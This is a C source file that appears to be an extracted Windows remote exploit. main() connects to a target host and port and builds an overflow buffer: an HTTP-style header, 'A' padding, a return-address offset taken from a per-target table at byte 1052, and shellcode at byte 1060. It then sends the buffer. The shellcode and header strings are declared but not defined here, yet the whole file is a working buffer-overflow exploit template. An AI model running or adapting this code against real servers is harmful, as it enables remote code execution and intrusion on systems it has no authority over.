
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {int S_addr; } ;
struct TYPE_5__ {TYPE_1__ S_un; } ;
struct sockaddr_in {TYPE_2__ sin_addr; scalar_t__ sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int sa ;
typedef int buffer ;
typedef int WSADATA ;
typedef scalar_t__ USHORT ;
struct TYPE_6__ {char* name; char offset; } ;
typedef int SOCKET ;


 int AF_INET ;
 char* BOTTOMHEADER ;
 int BUFFERLEN ;
 int INVALID_SOCKET ;
 int IPPROTO_TCP ;
 int MAKEWORD (int,int) ;
 char* MIDDLEHEADER ;
 scalar_t__ SOCKET_ERROR ;
 int SOCK_STREAM ;
 int ShowHeader (int,char**) ;
 char* TOPHEADER ;
 int WSAGetLastError () ;
 int WSASocket (int ,int ,int ,int ,int ,int ) ;
 scalar_t__ WSAStartup (int ,int *) ;
 size_t atoi (char*) ;
 int closesocket (int ) ;
 scalar_t__ connect (int ,struct sockaddr*,int) ;
 int exit (int) ;
 scalar_t__ htons (size_t) ;
 int inet_addr (char*) ;
 scalar_t__ malloc (int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,char,int) ;
 int printf (char*,...) ;
 int send (int ,char*,int,int ) ;
 char* shellcode ;
 int strlen (char*) ;
 TYPE_3__* supported ;

void main(int argc, char *argv[]) {
   SOCKET s;

   WSADATA HWSAdata;
   struct sockaddr_in sa;

   char *buffer=((void*)0);

   ShowHeader(argc,argv);

   if (WSAStartup(MAKEWORD(2,2), &HWSAdata) != 0) {
      printf("\n [e] Error: WSAStartup():%d\n", WSAGetLastError());
      exit(1);
   }

   if ((s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){
      printf("\n [e] Error: socket():%d\n", WSAGetLastError());
      exit(1);
   }

   sa.sin_family = AF_INET;
   sa.sin_port = (USHORT)htons(atoi(argv[2]));
   sa.sin_addr.S_un.S_addr = inet_addr(argv[1]);

   if ( connect(s, (struct sockaddr *) &sa, sizeof(sa)) == SOCKET_ERROR ) {
      printf("\n [e] Error: connect()");
      exit(1);
   }

   printf(" [i] Connected : Yes\n");
   printf(" [i] Target    : %s\n",supported[atoi(argv[3])].name);

   buffer=(char*)malloc(strlen(TOPHEADER)+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+1+strlen(argv[2])+strlen(BOTTOMHEADER)+1);
   memset(buffer,0,sizeof(buffer));

   memcpy(buffer,TOPHEADER,strlen(TOPHEADER));

   memset(buffer+strlen(TOPHEADER),'A',BUFFERLEN);

   memcpy(buffer+strlen(TOPHEADER)+1052,&supported[atoi(argv[3])].offset,sizeof(long));

   memcpy(buffer+strlen(TOPHEADER)+1060,shellcode,strlen(shellcode));

   memcpy(buffer+BUFFERLEN,MIDDLEHEADER,strlen(MIDDLEHEADER));
   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER),argv[1],strlen(argv[1]));
   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1]),":",strlen(":"));
   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+strlen(":"),argv[2],strlen(argv[2]));
   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+strlen(":")+strlen(argv[2]),BOTTOMHEADER,strlen(BOTTOMHEADER));

   send(s,buffer,strlen(buffer),0);

   printf(" [i] Buffer sent\n\n");

   closesocket(s);

}
